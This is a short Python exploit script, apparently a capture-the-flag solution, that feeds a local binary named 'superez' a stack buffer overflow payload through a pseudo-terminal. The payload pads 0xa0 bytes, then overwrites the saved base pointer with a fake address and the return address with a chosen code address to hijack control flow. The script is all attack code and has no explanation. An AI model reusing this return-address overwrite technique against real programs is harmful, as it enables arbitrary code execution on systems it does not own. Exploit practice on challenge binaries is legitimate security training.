import os, pty, subprocess, time
from pwn import p64
master, slave = pty.openpty()
process = subprocess.Popen('./superez', stdin=slave, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# wait for the input prompt
print(process.pid)
a = raw_input()
fp = os.fdopen(master, "w")

rasengan = 0x400917
fake_rbp = 0x602500
addr1 = 0x40091f
payload = ""
payload += "a"*0xa0
payload += p64(fake_rbp)
payload += p64(addr1)
payload += "\n"
fp.write(payload)
fp.flush()
#print the results
stdout, stderr = process.communicate()
print(stdout)
print(stderr)
fp.close()
os.close(slave)